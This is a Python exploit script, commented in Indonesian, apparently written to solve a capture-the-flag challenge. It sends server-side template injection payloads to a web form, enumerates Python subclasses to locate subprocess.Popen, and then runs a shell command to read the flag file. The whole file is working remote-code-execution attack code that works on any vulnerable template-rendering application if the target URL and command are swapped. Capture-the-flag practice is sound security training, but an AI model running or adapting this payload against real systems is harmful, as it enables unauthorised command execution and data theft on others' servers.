import requests
from bs4 import BeautifulSoup

# Konfigurasi
url = "http://ctf.antix.or.id:29801/"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Fungsi untuk kirim payload dan ambil hasil render
def send_payload(payload):
    try:
        res = requests.post(url, data=f"expression={payload}", headers=headers, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.get_text()
    except Exception as e:
        return f"[!] Error: {e}"

# 1. Cari index dari subprocess.Popen
def find_popen_index(start=0, end=500):
    print("[*] Searching for subprocess.Popen...")
    for i in range(start, end):
        payload = f"{{{{ dict.__base__.__subclasses__()[{i}] }}}}"
        result = send_payload(payload)
        if "subprocess.Popen" in result or "Popen" in result:
            print(f"[+] Found subprocess.Popen at index: {i}")
            print(result.strip())
            return i
    print("[!] subprocess.Popen not found")
    return None

# 2. Eksekusi perintah via subprocess.Popen
def execute_command(popen_index, command="cat /flag.txt"):
    payload = (
        f"{{{{ dict.__base__.__subclasses__()[{popen_index}]("
        f"'{command}', shell=True, stdout=-1).communicate() }}}}"
    )
    print(f"[*] Executing: {command}")
    result = send_payload(payload)
    print("\n[+] Command Output:\n", result.strip())

# Main
if __name__ == "__main__":
    popen_index = find_popen_index()
    if popen_index is not None:
        execute_command(popen_index)
